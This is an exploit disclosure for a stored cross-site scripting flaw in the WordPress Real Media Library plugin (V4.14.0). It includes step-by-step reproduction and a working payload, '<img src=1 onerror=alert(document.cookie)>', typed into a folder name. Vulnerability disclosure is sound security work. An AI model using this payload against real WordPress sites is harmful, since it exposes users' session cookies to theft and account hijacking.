# Exploit Title:  WordPress Real Media Library plugin cross-site scripting vulnerabilities
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/real-media-library-lite/
# Version :  V4.14.0
# Vulnerability Type: Cross-site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. Click New Folder  
2. Folder name input:<img src=1 onerror=alert(document.cookie)>,click save
3.The cookie identity information pops up successfully,   And the xss payload has no missing characters
![image](https://github.com/BigTiger2020/word-press/blob/main/xss.gif)



